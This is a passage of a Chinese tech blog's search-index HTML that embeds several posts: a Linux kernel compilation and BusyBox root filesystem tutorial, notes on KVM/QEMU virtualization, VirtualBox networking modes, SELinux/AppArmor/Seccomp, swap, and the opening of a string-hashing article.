   https://mirrors.edge.kernel.org/pub/linux/kernel/
2. 安装内核编译所需的环境
   sudo apt install git fakeroot build-essential ncurses-dev xz-utils libssl-dev bc flex libelf-dev bison -y
   # centos： yum install ncurses-devel make gcc bc openssl-devel
3. 解压内核源码
   xz -d linux-5.3.8.tar.xz &amp;amp;&amp;amp; tar xvf linux-5.3.8.tar
4. 生成.config文件(拷贝当前操作系统的配置文件)
   # export ARCH=x86 指定硬件体系结构
   # make x86_64_defconfig 配置为x86_64_defconfig
   # 当然可以直接拷贝当前操作系统的config文件
   cp /boot/config-`uname -r` .config
   make menuconfig  # 对内核进行微调配置

General setup  ---&amp;gt;
       ----&amp;gt; [*] Initial RAM filesystem and RAM disk (initramfs/initrd) support # 支持cpio格式文件系统
    Device Drivers  ---&amp;gt;
       [*] Block devices  ---&amp;gt;
               &amp;lt;*&amp;gt;   RAM block device support 
               (65536) Default RAM disk size (kbytes)


5. 编译内核
   make -j $(nproc)
   # 此过程生成vmlinux，编译成功后内核位于arch/x86_64/boot/bzImage
   # 如果需要将编译好的内核安装在当前的物理主机上，可以进行下面的步骤
6. 安装编译生成的modules
   sudo make modules_install
7. 安装新内核相关文件
   sudo make install
   # 此过程生成vmlinuz
8. 重启
   reboot
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;对于linux内核，编译可以生成不同的镜像文件，例如：make zImage、make uImage&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;他们之间的区别：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;vmlinux：编译出来的最原始的内核文件，未压缩&lt;/li&gt;
&lt;li&gt;zImage：是vmlinux经过gzip压缩后的文件&lt;/li&gt;
&lt;li&gt;bzImage bz表示“big zImage”，不是用bzip2压缩的。两者的不同之处在于，zImage解压缩内核到低端内存(第一个640K)，bzImage解压缩内核到高端内存(1M以上)。如果内核比较小，那么采用zImage或bzImage都行，如果比较大应该用bzImage。&lt;/li&gt;
&lt;li&gt;uImage   U-boot专用的映像文件，它是在zImage之前加上一个长度为0x40的tag。&lt;/li&gt;
&lt;li&gt;vmlinuz  是bzImage/zImage文件的拷贝或指向bzImage/zImage的链接。&lt;/li&gt;
&lt;/ul&gt;
&lt;/blockquote&gt;
&lt;h3 id=&#34;编译制作busybox根文件系统&#34;&gt;编译制作busybox根文件系统&lt;/h3&gt;
&lt;p&gt;busybox是一个集成了一百多个最常用linux命令和工具的软件，通过编译busybox可以生成这些工具的二进制可执行程序。&lt;/p&gt;
&lt;p&gt;前置软件：&lt;/p&gt;
&lt;p&gt;apt install libncurses5-dev -y&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;下载busybox源码 https://busybox.net/downloads/&lt;/li&gt;
&lt;/ol&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;mkdir /home/rootfs &amp;amp;&amp;amp; cd /home/rootfs
wget https://busybox.net/downloads/busybox-1.20.0.tar.bz2
&lt;/code&gt;&lt;/pre&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;解压配置&lt;/li&gt;
&lt;/ol&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;tar -xvf busybox-1.20.0.tar.bz2
make menuconfig
&lt;/code&gt;&lt;/pre&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://cactusii.github.io//post-images/1630570726475.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;blockquote&gt;
&lt;p&gt;Busybox Settings -&amp;gt; Build Option&lt;br&gt;
[ ]Build BusyBox as a static binary (no shared libs)&lt;br&gt;
编译完成之后会生成一个busybox可执行程序，其用法是# busybox ls、busybox mkdir 就相当于执行ls、mkdir，如果选择静态编译，那么编译出来的busybox是可以单独运行的，但是自己编写的程序要是在busybox文件系统上运行则需要使用静态编译，即例如：gcc -static hello.c -o hello才可以运行。&lt;br&gt;
如果不选择该选项，则编译出来的busybox不可以独立运行，需要将相应的的动态库或者符号链接等复制到busybox文件系统中相对应的目录中，否则程序不能运行，那么自己编写的程序就不需要使用静态编译了。&lt;/p&gt;
&lt;p&gt;( )Cross Compiler prefix (NEW)&lt;br&gt;
标识用什么编译器来编译busybox，默认用x86(应该)&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ol start=&#34;3&#34;&gt;
&lt;li&gt;编译和安装&lt;/li&gt;
&lt;/ol&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;vi include/libbb.h
#include &amp;lt;sys/resource.h&amp;gt;
# 不添加会报错
# scripts/Makefile.build:197: recipe for target &#39;loginutils/passwd.o&#39; failed
# Makefile:740: recipe for target &#39;loginutils&#39; failed

make &amp;amp;&amp;amp; make install
&lt;/code&gt;&lt;/pre&gt;
&lt;ol start=&#34;4&#34;&gt;
&lt;li&gt;编译完成后的busybox就安装在源码根目录下的_install目录了，我们进入_install目录，补充一些必要的文件或目录，相关的shell命令如下：&lt;/li&gt;
&lt;/ol&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;mkdir etc dev mnt
mkdir -p proc sys tmp mnt
mkdir -p etc/init.d/
vim etc/fstab

proc        /proc           proc         defaults        0        0
tmpfs       /tmp            tmpfs    　　defaults        0        0
sysfs       /sys            sysfs        defaults        0        0

vim etc/init.d/rcS

echo -e &amp;quot;Welcome to tinyLinux&amp;quot;
/bin/mount -a
echo -e &amp;quot;Remounting the root filesystem&amp;quot;
mount  -o  remount,rw  /
mkdir -p /dev/pts
mount -t devpts devpts /dev/pts
echo /sbin/mdev &amp;gt; /proc/sys/kernel/hotplug
mdev -s

chmod 755 etc/init.d/rcS
vim etc/inittab

::sysinit:/etc/init.d/rcS
::respawn:-/bin/sh
::askfirst:-/bin/sh
::ctrlaltdel:/bin/umount -a -r

chmod 755 etc/inittab
cd dev
mknod console c 5 1
mknod null c 1 3
mknod tty1 c 4 1
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;这样一个最小的、完整的可以被内核启动的文件系统就完成了。&lt;/p&gt;
&lt;h3 id=&#34;制作根文件系统的镜像文件&#34;&gt;制作根文件系统的镜像文件&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;先制作一个空的镜像文件；&lt;/li&gt;
&lt;li&gt;然后把此镜像文件格式化为ext3格式；&lt;/li&gt;
&lt;li&gt;然后把此镜像文件挂载，并把根文件系统复制到挂载目录；&lt;/li&gt;
&lt;li&gt;卸载该镜像文件。&lt;/li&gt;
&lt;li&gt;打成gzip包&lt;/li&gt;
&lt;/ol&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;#!/bin/bash
rm -rf rootfs.ext3
rm -rf fs
dd if=/dev/zero of=./rootfs.ext3 bs=1M count=32
mkfs.ext3 rootfs.ext3
mkdir fs
mount -o loop rootfs.ext3 ./fs
cp -rf ./_install/* ./fs
umount ./fs
gzip --best -c rootfs.ext3 &amp;gt; rootfs.img.gz 
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;通过qemu就可以将编译好的内核和文件系统镜像启动了。&lt;/p&gt;
&lt;h3 id=&#34;一些报错&#34;&gt;一些报错&lt;/h3&gt;
&lt;h4 id=&#34;内核&#34;&gt;内核&lt;/h4&gt;
&lt;blockquote&gt;
&lt;p&gt;编译内核报错：make[1]: *** 没有规则可制作目标“certs/rhel.pem”，由“certs/x509_certificate_list” 需求。 停止&lt;br&gt;
make menuconfig&lt;br&gt;
Cryptographic API &amp;gt;&lt;br&gt;
Certificates for signature checking &amp;gt;&lt;br&gt;
Additional X.509 keys for default system keyring  删除内容&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&#34;re&#34;&gt;re&lt;/h3&gt;
&lt;p&gt;https://blog.csdn.net/weixin_38251305/article/details/104268266&lt;br&gt;
内核地址&lt;br&gt;
https://mirrors.edge.kernel.org/pub/linux/kernel/&lt;br&gt;
http://ftp.sjtu.edu.cn/sites/ftp.kernel.org/pub/linux/kernel/&lt;/p&gt;
&lt;p&gt;ubuntu&lt;br&gt;
https://www.cnblogs.com/haiyonghao/p/14440263.html&lt;/p&gt;
&lt;p&gt;centos&lt;br&gt;
https://blog.csdn.net/daa20/article/details/105011505/&lt;br&gt;
https://www.linuxidc.com/Linux/2015-11/125671.htm&lt;/p&gt;
">【linux】编译安装内核、编译busybox文件系统</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://cactusii.github.io/post/xu-ni-hua-kvm/"" data-c="
          &lt;h2 id=&#34;虚拟化&#34;&gt;虚拟化&lt;/h2&gt;
&lt;h3 id=&#34;全虚拟化&#34;&gt;全虚拟化&lt;/h3&gt;
&lt;p&gt;全虚拟化也称为硬件虚拟化，需要处理器、主板芯片、BIOS等的虚拟化支持，该模型使用虚拟机协调guest操作系统和原始硬件，VMM在guest操作系统和裸硬件之间用于工作协调，一些受保护指令必须由Hypervisor（虚拟机管理程序）来捕获处理。全虚拟化的运行速度要快于硬件模拟，但是性能方面不如裸机。&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://cactusii.github.io//post-images/1627557883376.jpg&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;h3 id=&#34;半虚拟化&#34;&gt;半虚拟化&lt;/h3&gt;
&lt;p&gt;半虚拟化是另一种类似于全虚拟化的技术，它使用Hypervisor分享存取底层的硬件，但是它的guest操作系统集成了虚拟化方面的代码。该方法无需重新编译或引起陷阱，因为操作系统自身能够与虚拟进程进行很好的协作。半虚拟化需要guest操作系统做一些修改，使guest操作系统意识到自己是处于虚拟化环境的，但是半虚拟化提供了与原操作系统相近的性能。&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;2&#34;&gt;&lt;img src=&#34;https://cactusii.github.io//post-images/1627557891052.jpg&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;h3 id=&#34;虚拟化产品&#34;&gt;虚拟化产品&lt;/h3&gt;
&lt;p&gt;开源的：KVM、Xen&lt;/p&gt;
&lt;p&gt;厂商：&lt;br&gt;
&lt;img src=&#34;https://cactusii.github.io//post-images/1627557789252.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;p&gt;虚拟化历史：&lt;br&gt;
&lt;img src=&#34;https://cactusii.github.io//post-images/1627558184108.jpg&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;kvm&#34;&gt;kvm&lt;/h2&gt;
&lt;p&gt;KVM是集成到Linux内核的Hypervisor，是X86架构且硬件支持虚拟化技术（Intel VT或AMD-V）的Linux的全虚拟化解决方案。它是Linux的一个很小的模块，利用Linux做大量的事，如任务调度、内存管理与硬件设备交互等。&lt;/p&gt;
&lt;p&gt;所以说可以自己搭建KVM替代VM，性能更好。&lt;/p&gt;
&lt;p&gt;搭建KVM环境主要包括：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;qemu：用于提供虚拟化服务。&lt;/li&gt;
&lt;li&gt;libvirt：提供libvirtd服务，用于管理物理机中的虚拟化实例，并提供外部编程接口。&lt;/li&gt;
&lt;li&gt;页面管理器：webvirtmgr等，提供前端页面，操作本地libvirt，对虚拟机进行新建、删除、设置、运行&lt;/li&gt;
&lt;li&gt;vnc服务：页面上控制虚拟机的鼠标键盘显示设备，用来装系统用。&lt;/li&gt;
&lt;/ol&gt;
&lt;blockquote&gt;
&lt;p&gt;libvirt：操作和管理KVM虚机的虚拟化 API，使用 C 语言编写，可以由 Python,Ruby, Perl, PHP, Java 等语言调用。可以操作包括 KVM，vmware，XEN，Hyper-v, LXC 等 Hypervisor。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&#34;kvm架构&#34;&gt;kvm架构&lt;/h3&gt;
&lt;p&gt;KVM 中，&lt;strong&gt;虚拟机被实现为常规的 Linux 进程&lt;/strong&gt;，由标准 Linux 调度程序进行调度；虚机的每个虚拟 CPU 被实现为一个常规的 Linux 进程。这使得 KMV 能够使用 Linux 内核的已有功能。 但是，KVM 本身不执行任何硬件模拟，需要客户空间程序通过 /dev/kvm 接口设置一个客户机虚拟服务器的地址空间，向它提供模拟的 I/O，并将它的视频显示映射回宿主的显示屏。目前这个应用程序是 QEMU。&lt;/p&gt;
&lt;p&gt;一个虚拟机的内存与任何其它linux进程的内存一样进行存储，同时能够使用linux支持的任何存储来存储虚拟机镜像，包括IDE、SCSI、SATA的本地磁盘等。&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;3&#34;&gt;&lt;img src=&#34;https://cactusii.github.io//post-images/1627559108922.jpg&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;ul&gt;
&lt;li&gt;Guest：客户机系统，包括CPU（vCPU）、内存、驱动（Console、网卡、I/O 设备驱动等），被 KVM 置于一种受限制的 CPU 模式下运行。&lt;/li&gt;
&lt;li&gt;KVM：运行在内核空间，提供CPU 和内存的虚级化，以及客户机的 I/O 拦截。Guest 的 I/O 被 KVM 拦截后，交给 QEMU 处理。&lt;/li&gt;
&lt;li&gt;QEMU-KVM：修改过的为 KVM 虚机使用的 QEMU 代码，运行在用户空间，提供硬件 I/O 虚拟化，通过 IOCTL /dev/kvm 设备和 KVM 交互。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;https://zhuanlan.zhihu.com/p/31894107&lt;/p&gt;
&lt;p&gt;https://www.evernote.com/shard/s325/client/snv?noteGuid=bebe0aaa-9d30-4624-9772-a0af9dfffead&amp;amp;noteKey=a08905a6b6733c5cd945bba560d4d927&amp;amp;sn=https%3A%2F%2Fwww.evernote.com%2Fshard%2Fs325%2Fsh%2Fbebe0aaa-9d30-4624-9772-a0af9dfffead%2Fa08905a6b6733c5cd945bba560d4d927&amp;amp;title=QEMU%252BKVM%25E5%25AD%25A6%25E4%25B9%25A0%25E7%25AC%2594%25E8%25AE%25B0&lt;/p&gt;
">【虚拟化】kvm qemu</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://cactusii.github.io/post/virtual-box-shang-si-chong-bu-tong-de-wang-luo-lian-jie-mo-shi/"" data-c="
          &lt;p&gt;&lt;strong&gt;Bridged(桥接模式)&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;将虚拟机的虚拟网络适配器（虚拟网卡）与主机的物理网络适配器（虚拟网卡）进行交接，虚拟机中的虚拟网络适配器可通过主机中的物理网络适配器直接访问到外部网络。简而言之，这就好像在局域网中添加了一台新的、独立的计算机一样。因此，虚拟机也会占用局域网中的一个IP地址，并且可以和其他终端进行相互访问。&lt;/p&gt;
&lt;p&gt;桥接模式网络连接支持有线和无线主机网络适配器。如果想把虚拟机当做一台完全独立的计算机看待，并且允许它和其他终端一样的进行网络通信，那么桥接模式通常是虚拟机访问网络的最简单途径。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;特点：&lt;/strong&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;如果主机可以上网，虚拟机可以上网&lt;/li&gt;
&lt;li&gt;虚拟机之间可以ping通&lt;/li&gt;
&lt;li&gt;虚拟机可以ping通主机&lt;/li&gt;
&lt;li&gt;主机可以ping通虚拟机&lt;/li&gt;
&lt;li&gt;如果主机不可以上网，所有1-4特点均无&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;使用场景：虚拟机要求可以上网，且虚拟机完全模拟一台实体机。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;NAT(网络地址转换模式)&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;使用NAT模式网络连接时，VMware会在主机上建立单独的专用网络，用以在主机和虚拟机之间相互通信。虚拟机向外部网络发送的请求数据”包裹”，都会交由NAT网络适配器加上”特殊标记”并以主机的名义转发出去，外部网络返回的响应数据”包裹”，也是先由主机接收，然后交由NAT网络适配器根据”特殊标记”进行识别并转发给对应的虚拟机，因此，虚拟机在外部网络中不必具有自己的IP地址。从外部网络来看，虚拟机和主机在共享一个IP地址，默认情况下，外部网络终端也无法访问到虚拟机。此外，在一台主机上只允许有一个NAT模式的虚拟网络。因此，同一台主机上的多个采用NAT模式网络连接的虚拟机也是可以相互访问的。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;特点：&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;如果主机可以上网，虚拟机可以上网&lt;/li&gt;
&lt;li&gt;虚拟机之间不能ping通&lt;/li&gt;
&lt;li&gt;虚拟机可以ping通主机（此时ping虚拟机的网关，即是ping主机）&lt;/li&gt;
&lt;li&gt;主机不能ping通虚拟机&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;使用场景：虚拟机只要求可以上网，无其它特殊要求，满足最一般需求。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Host-Only(仅主机模式)&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;仅主机模式，是一种比NAT模式更加封闭的的网络连接模式，它将创建完全包含在主机中的专用网络。仅主机模式的虚拟网络适配器仅对主机可见，并在虚拟机和主机系统之间提供网络连接。相对于NAT模式而言，仅主机模式不具备NAT功能，因此在默认情况下，使用仅主机模式网络连接的虚拟机无法连接到Internet(在主机上安装合适的路由或代理软件，或者在Windows系统的主机上使用Internet连接共享功能，仍然可以让虚拟机连接到Internet或其他网络)。在同一台主机上可以创建多个仅主机模式的虚拟网络，如果多个虚拟机处于同一个仅主机模式网络中，那么它们之间是可以相互通信的；如果它们处于不同的仅主机模式网络，则默认情况下无法进行相互通信(可通过在它们之间设置路由器来实现相互通信)。&lt;/p&gt;
&lt;p&gt;特点：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;虚拟机不可以上网&lt;/li&gt;
&lt;li&gt;虚拟机之间可以ping通&lt;/li&gt;
&lt;li&gt;虚拟机可以ping通主机（注意虚拟机与主机通信是通过主机的名为VirtualBox Host-Only Network的网卡，因此ip是该网卡ip 192.168.56.1，而不是你现在正在上网所用的ip）&lt;/li&gt;
&lt;li&gt;主机可以ping通虚拟机&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;使用场景：在主机无法上网的情况下（主机可以上网的情况下可以用host-only，也可以用桥接），需要搭建一个模拟局域网，所有机器可以互访&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;内部网络&lt;/strong&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;虚拟机不可以上网&lt;/li&gt;
&lt;li&gt;虚拟机之间可以ping通&lt;/li&gt;
&lt;li&gt;虚拟机不能ping通主机&lt;/li&gt;
&lt;li&gt;主机不能ping通虚拟机&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;使用场合：让各台虚拟机处于隔离的局域网内，只让它们相互通信，与外界（包括主机）隔绝&lt;/p&gt;
">【虚拟化】Virtual Box上四种不同的网络连接模式</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://cactusii.github.io/post/linux-selinux-he-apparmor/"" data-c="
          &lt;h2 id=&#34;selinux&#34;&gt;SELinux&lt;/h2&gt;
&lt;p&gt;Kernel2.6之后引入，由美国国家安全局开发，作为一个强制访问控制架构。&lt;/p&gt;
&lt;p&gt;SELinux主要是红帽以及它的衍生发行版linux 的一个工具；Ubuntu/SUSE以及它的衍生发行版本使用的是AppArmor。但也可以在ubuntu上安装SELinux。&lt;/p&gt;
&lt;p&gt;Linux上传统的访问控制标准是自主访问控制Discretionary Access Control（DAC）。在这种形式下，一个软件或守护进程以User ID（UID）或Set owner User ID（SUID）的身份运行，并且拥有该用户的目标（文件、套接字、以及其它进程）权限。这使得恶意代码很容易运行在特定权限之下，从而取得访问关键的子系统的权限。&lt;/p&gt;
&lt;p&gt;另一方面，强制访问控制Mandatory Access Control（MAC）基于保密性和完整性强制信息的隔离以限制破坏。该限制单元独立于传统的Linux安全机制运作，并且没有超级用户的概念。&lt;/p&gt;
&lt;h3 id=&#34;如何工作&#34;&gt;如何工作&lt;/h3&gt;
&lt;p&gt;相关概念：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;主体Subjects&lt;/li&gt;
&lt;li&gt;客体Objects&lt;/li&gt;
&lt;li&gt;策略Policy&lt;/li&gt;
&lt;li&gt;模式Mode&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;当一个主体Subject(如一个程序)尝试访问一个目标Object(如一个文件)，SELinux安全服务器从策略数据库Policy DB中运行一个检查。基于当前的模式mode，如果SELinux安全服务器授予权限，该主体就能够访问该目标。如果SELinux安全服务器拒绝了权限，就会在/var/log/messages中记录一条拒绝信息。&lt;/p&gt;
&lt;h3 id=&#34;模式&#34;&gt;模式&lt;/h3&gt;
&lt;p&gt;SELinux有三个模式。这些模式将规定SELinux在主体请求时如何应对。这些模式是：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;enforcing 策略强制执行，基于SELinux策略规则授予或拒绝主体对目标的访问；&lt;/li&gt;
&lt;li&gt;permissive 不强制执行，不实际拒绝访问，但会有拒绝信息写入日志&lt;/li&gt;
&lt;li&gt;disabled 禁用SELinux&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;可以通过命令&lt;code&gt;getenforce&lt;/code&gt;查看SELinux设置的模式，默认为Enforcing。&lt;br&gt;
可以通过命令&lt;code&gt;setenforce&lt;/code&gt;临时修改模式，&lt;code&gt;setenforce 1 =&amp;gt; enforcing&lt;/code&gt;，&lt;code&gt;setenforce 0 =&amp;gt; permissive&lt;/code&gt;。还可以修改&lt;code&gt;/etc/selinux/config&lt;/code&gt;文件的&lt;code&gt;SELINUX=&lt;/code&gt;。&lt;br&gt;
重启操作系统才能生效&lt;/p&gt;
&lt;h3 id=&#34;策略&#34;&gt;策略&lt;/h3&gt;
&lt;p&gt;SELinux的策略有两种：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;targeted，只有目标网络进程受保护(dhcpd httpd named ntpd portmap snmpd squid syslogd)&lt;/li&gt;
&lt;li&gt;strict，对所有进程完全的SELinux保护&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;同样在&lt;code&gt;etc/selinux/config&lt;/code&gt;中修改&lt;code&gt;SELINUXTYPE=&lt;/code&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;cat /etc/selinux/config 

# This file controls the state of SELinux on the system.
# SELINUX= can take one of these three values:
#     enforcing - SELinux security policy is enforced.
#     permissive - SELinux prints warnings instead of enforcing.
#     disabled - No SELinux policy is loaded.
SELINUX=enforcing
# SELINUXTYPE= can take one of three values:
#     targeted - Targeted processes are protected,
#     minimum - Modification of targeted policy. Only selected processes are protected. 
#     mls - Multi Level Security protection.
SELINUXTYPE=targeted
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;SELinux需要一个好的策略才能发挥最好的效果，如果策略写的太宽松会发挥不了作用，太严格又会引来很多麻烦。美国国家安全局将策略的指定交由Linux的发行商来做，红帽自己指定的一个基本的策略，一共包括25个系统服务：ypbind,dhcpd,httpd,mysqld,named,nscd,ntpd,pegasus,portmap,postgresql,snmpd,squid,syslogd,winbind,use_nfs_home_dirs。&lt;/p&gt;
&lt;p&gt;策略的内容在&lt;code&gt;/etc/selinux/targeted&lt;/code&gt;目录下，包括三个主要文件：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;booleans：存放targeted policy中每个限制的布尔值；&lt;/li&gt;
&lt;li&gt;contexts/：存储targeted policy中的security contexts；&lt;/li&gt;
&lt;li&gt;policy/：存放二进制policy文件policy.31。&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;检查selinux状态&#34;&gt;检查SELinux状态&lt;/h3&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;sestatus -v
SELinux status:                 enabled
SELinuxfs mount:                /sys/fs/selinux
SELinux root directory:         /etc/selinux
Loaded policy name:             targeted
Current mode:                   enforcing
Mode from config file:          enforcing
Policy MLS status:              enabled
Policy deny_unknown status:     allowed
Max kernel policy version:      31

Process contexts:
Current context:                unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
Init context:                   system_u:system_r:init_t:s0
/usr/sbin/sshd                  system_u:system_r:sshd_t:s0-s0:c0.c1023

File contexts:
Controlling terminal:           unconfined_u:object_r:user_devpts_t:s0
/etc/passwd                     system_u:object_r:passwd_file_t:s0
/etc/shadow                     system_u:object_r:shadow_t:s0
/bin/bash                       system_u:object_r:shell_exec_t:s0
/bin/login                      system_u:object_r:login_exec_t:s0
/bin/sh                         system_u:object_r:bin_t:s0 -&amp;gt; system_u:object_r:shell_exec_t:s0
/sbin/agetty                    system_u:object_r:getty_exec_t:s0
/sbin/init                      system_u:object_r:bin_t:s0 -&amp;gt; system_u:object_r:init_exec_t:s0
/usr/sbin/sshd                  system_u:object_r:sshd_exec_t:s0

ls -Z # 查看文件的selinux上下文信息
ps- Z # 进程的selinux域信息
restorecon -R /var/www # 恢复一个文件的模式selinux上下文
chcon --reference=/etc/named.conf.org /etc/named.fon # 修改一个文件的selinux上下文
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;总的来说，SELinux策略比较复杂，但是对于docker十分友善，因为Docker SELinux模块已经帮我们做了哪些复杂的SELinux策略，用户只需要在Docker daemon启动的时候加上--selinux-enabled=true选项就可以了。可以使用-security-opt选项来对指定的文件做限制。&lt;em&gt;使用方法待补充&lt;/em&gt;&lt;/p&gt;
&lt;h2 id=&#34;apparmor&#34;&gt;AppArmor&lt;/h2&gt;
&lt;p&gt;AppAromor的主要作用是设置某个可执行程序的访问控制权限，可以限制程序读写某个文件、目录，打开读写网络端口等。AppArmor安全策略可以完全定义个别应用程序所能访问的系统资源与各自的特权。&lt;/p&gt;
&lt;p&gt;Docker daemon在启动的过程中会去判断当前内核是否支持AppArmor，若支持，就创建默认的Apparmor配置文件/etc/apparmor.d/docker，并应用这个配置文件。启动容器时，在初始化过程中Docker会使用相应的AppArmor配置作用于容器。也可以使用--security-opt选项来指定作用于容器的AppArmor配置文件。&lt;/p&gt;
&lt;p&gt;目前在支持SELinux的系统上，Docker的SELinux不是默认打开的，需要手动加上--selinux-enabled=true，而支持AppAromor的系统上，默认时打开的。&lt;/p&gt;
&lt;h2 id=&#34;seccomp&#34;&gt;Seccomp&lt;/h2&gt;
&lt;p&gt;Seccomp时linux内核提供的安全特性，以白名单或黑名单的方式限制进程进行系统调用。Seccomp&lt;/p&gt;
">【linux】SELinux | AppArmor | Seccomp</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://cactusii.github.io/post/linux-swap-jiao-huan-fen-qu/"" data-c="
          &lt;p&gt;swap分区通常被称为交换分区，这是一块特殊的硬盘上的空间，即当实际内存不够用的时候，操作系统会从内存中取出一部分暂时不用的数据放在交换分区中，从而腾出一些内存空间，等到那些应用程序使用这些数据时，再从交换分区中恢复到内存空间。不应该把它当作物理内存的扩展。&lt;/p&gt;
&lt;p&gt;使用交换分区的优点是应用程序实际可以使用的内存空间远远超过系统的物理内存，缺点是如果频繁地读写硬盘，会显著降低操作系统的运行效率。&lt;/p&gt;
&lt;p&gt;一般交换分区的容量应该大于物理内存大小，建议是内存的两倍，但不超过2G。&lt;/p&gt;
&lt;p&gt;所以说如果物理内存足够的话，完全不需要交换分区。&lt;/p&gt;
">【linux】swap交换分区</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://cactusii.github.io/post/shu-ju-jie-gou-zi-fu-chuan-ha-xi/"" data-c="
          &lt;p&gt;先看一下这道题：&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://cactusii.github.io//post-images/1627106992146.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;用substr肯定超时，这道题可以用字符串哈希。&lt;/p&gt;
&lt;p&gt;大致思路是：&lt;/p&gt;
&lt;p&gt;把字符串映射成一个P进制的数来表示，例如字符串&lt;code&gt;ABCD&lt;/code&gt;，那么可以令A=1，B=2，C=3，D=4，...，那么&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mi&gt;h&lt;/mi&gt;&lt;mi&gt;a&lt;/mi&gt;&lt;mi&gt;s&lt;/mi&gt;&lt;mi&gt;h&lt;/mi&gt;&lt;mo&gt;(&lt;/mo&gt;&lt;mi&gt;A&lt;/mi&gt;&lt;mi&gt;B&lt;/mi&gt;&lt;mi&gt;C&lt;/mi&gt;&lt;mi&gt;D&lt;/mi&gt;&lt;mo&gt;)&lt;/mo&gt;&lt;mo&gt;=&lt;/mo&gt;&lt;mn&gt;1&lt;/mn&gt;&lt;mo&gt;∗&lt;/mo&gt;&lt;msup&gt;&lt;mi&gt;P&lt;/mi&gt;&lt;mn&gt;3&lt;/mn&gt;&lt;/msup&gt;&lt;mo&gt;+&lt;/mo&gt;&lt;mn&gt;2&lt;/mn&gt;&lt;mo&gt;∗&lt;/mo&gt;&lt;msup&gt;&lt;mi&gt;P&lt;/mi&gt;&lt;mn&gt;2&lt;/mn&gt;&lt;/msup&gt;&lt;mo&gt;+&lt;/mo&gt;&lt;mn&gt;3&lt;/mn&gt;&lt;mo&gt;∗&lt;/mo&gt;&lt;msup&gt;&lt;mi&gt;P&lt;/mi&gt;&lt;mn&gt;1&lt;/mn&gt;&lt;/msup&gt;&lt;mo&gt;+&lt;/mo&gt;&lt;mn&gt;4&lt;/mn&gt;&lt;mo&gt;∗&lt;/mo&gt;&lt;msup&gt;&lt;mi&gt;P&lt;/mi&gt;&lt;mn&gt;0&l